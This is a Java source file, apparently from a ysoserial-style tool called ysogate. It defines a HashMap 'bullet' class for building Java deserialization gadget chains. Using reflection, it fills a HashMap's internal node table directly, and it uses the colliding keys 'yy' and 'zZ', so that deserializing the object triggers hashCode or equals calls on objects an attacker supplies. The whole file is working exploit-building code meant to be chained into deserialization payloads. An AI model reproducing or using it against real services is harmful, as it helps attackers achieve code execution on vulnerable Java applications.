package com.h2tg.ysogate.bullet.jdk;

import com.h2tg.ysogate.bullet.base.IReadObject2Equals;
import com.h2tg.ysogate.bullet.base.IReadObject2HashCode;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.util.HashMap;

import static com.h2tg.ysogate.utils.Reflections.setFieldValue;

public class GHashMap implements IReadObject2HashCode, IReadObject2Equals
{
    @Override
    public Object readObject2HashCode(Object v1, Object v2) throws Exception
    {
        HashMap s = new HashMap();
        setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setFieldValue(s, "table", tbl);
        return s;
    }

    @Override
    public HashMap readObject2Equals(Object v1, Object v2) throws Exception
    {
        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy", v1);
        map1.put("zZ", v2);

        map2.put("yy", v2);
        map2.put("zZ", v1);

        HashMap s = new HashMap();
        setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, map1, map1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, map2, map2, null));
        setFieldValue(s, "table", tbl);

        return s;
    }
}
